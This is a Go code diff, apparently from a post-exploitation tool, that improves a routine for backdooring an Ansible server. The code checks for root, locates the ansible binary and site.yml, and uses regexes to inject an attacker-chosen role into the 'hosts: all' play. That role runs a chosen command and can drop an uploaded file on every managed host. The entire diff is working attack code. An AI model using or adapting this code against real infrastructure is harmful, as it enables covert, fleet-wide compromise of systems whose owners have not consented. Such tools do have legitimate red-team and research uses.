@@ -1,26 +1,20 @@
 package main
 
 import (
-	"bufio"
-	"bytes"
-	"crypto/tls"
-	"encoding/json"
 	"flag"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"os"
+	"path/filepath"
+	"regexp"
+	"strings"
+	"text/template"
+
 	"github.com/fatih/color"
 	"github.com/gobuffalo/packr/v2"
 	"github.com/l50/goutils"
 	"github.com/l50/mose/pkg/moseutils"
-	"io"
-	"log"
-	"mime/multipart"
-	"net/http"
-	"os"
-	"path/filepath"
-	"regexp"
-	"strconv"
-	"strings"
-	"text/template"
-	"time"
 )
 
 type Command struct {
@@ -110,8 +104,8 @@ func backdoorSite(siteLoc string) {
 
 			For now a simple backdoor is gonna be just -include: backdoor.yml
 	*/
-	insertString := "    -" + ansibleRole + "\n"
-	nodeLines := regexp.MustCompile(`(?sm)}\s*?node\b`)
+	yesRoles := regexp.MustCompile(`(?sm)(hosts: all.*?roles:)`)
+	noRoles := regexp.MustCompile(`(?sm)(hosts: all.*?)^-`)
 	comments := regexp.MustCompile(`#.*`)
 
 	fileContent, err := ioutil.ReadFile(siteLoc)
@@ -121,17 +115,42 @@ func backdoorSite(siteLoc string) {
 	}
 
 	content := fmt.Sprint(comments.ReplaceAllString(string(fileContent), ""))
-	content = fmt.Sprint(nodeLines.ReplaceAllString(content, insertString+"}\nnode"))
 
-	err = ioutil.WriteFile(siteLoc, []byte(content), 0644)
-	if err != nil {
-		log.Fatalf("Failed to backdoor the site.yml located at %s, exiting.", siteLoc)
+	// Check if roles found first
+	found := yesRoles.MatchString(content)
+	if found {
+		matches := yesRoles.FindStringSubmatch(content)
+		insertString := matches[1] + "\n    - " + ansibleRole + "\n"
+		content = fmt.Sprint(yesRoles.ReplaceAllString(content, insertString))
+		err = ioutil.WriteFile(siteLoc, []byte(content), 0644)
+		if err != nil {
+			log.Fatalf("Failed to backdoor the site.yml located at %s, exiting.", siteLoc)
+		}
+
+		return
+
 	}
+
+	// Check if non roles section found
+	found = noRoles.MatchString(content)
+	if found {
+		matches := noRoles.FindStringSubmatch(content)
+		insertString := string(matches[1]) + "\n  roles:\n    - " + ansibleRole + "\n\n-"
+		content = fmt.Sprint(noRoles.ReplaceAllString(content, insertString))
+		err = ioutil.WriteFile(siteLoc, []byte(content), 0644)
+		if err != nil {
+			log.Fatalf("Failed to backdoor the site.yml located at %s, exiting.", siteLoc)
+		}
+
+		return
+	}
+
+	log.Fatalf("Failed to backdoor the site.yml located at %s, exiting.", siteLoc)
 }
 
 func getSiteLoc(siteLoc string) string {
 	d, _ := filepath.Split(siteLoc)
-	return filepath.Clean(filepath.Join(d, "../"))
+	return d
 }
 
 func createRole(siteLoc string, ansibleRole string, cmd string) {
@@ -147,7 +166,7 @@ func createRole(siteLoc string, ansibleRole string, cmd string) {
 		if uploadFileName != "" {
 			ansibleFiles := filepath.Join(roleLoc, "files")
 
-			moseutils.CreateFolders([]string{moduleFiles})
+			moseutils.CreateFolders([]string{ansibleFiles})
 			log.Printf("Copying  %s to module location %s", uploadFileName, ansibleFiles)
 			moseutils.CpFile(uploadFileName, filepath.Join(ansibleFiles, filepath.Base(uploadFileName)))
 			if err := os.Chmod(filepath.Join(ansibleFiles, filepath.Base(uploadFileName)), 0644); err != nil {
@@ -160,9 +179,8 @@ func createRole(siteLoc string, ansibleRole string, cmd string) {
 	}
 }
 
-func generatePlaybook(playbookLoc string, cmd str) {
+func generatePlaybook(playbookLoc string, cmd string) bool {
 	ansibleCommand := Command{
-		RoleName: ansibleRole,
 		CmdName:  "cmd",
 		Cmd:      bdCmd,
 		FileName: uploadFileName,
@@ -213,15 +231,15 @@ func main() {
 	// gonna assume not root then we screwed
 	utils.CheckRoot()
 
-	configLocs := findAnsibleConfig()
+	_ = findAnsibleConfig()
 
-	found, _ := moseutils.FindBin("ansible", []string{"/bin", "/home", "/opt", "/root"})
+	found, _ := moseutils.FindBin("ansible", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
 	if !found {
-		log.printf("ansible binary not found, exiting...")
+		log.Fatalf("ansible binary not found, exiting...")
 	}
 	found, siteLoc := moseutils.FindBin("site.yml", []string{"/etc/ansible", "/home", "/opt", "/root", "/var"})
 	if !found {
-		log.printf("site.yml not found, exiting...")
+		log.Fatalf("site.yml not found, exiting...")
 	}
 
 	msg("Backdooring the %s site.yml to run %s on all ansible roles, please wait...", siteLoc, bdCmd)
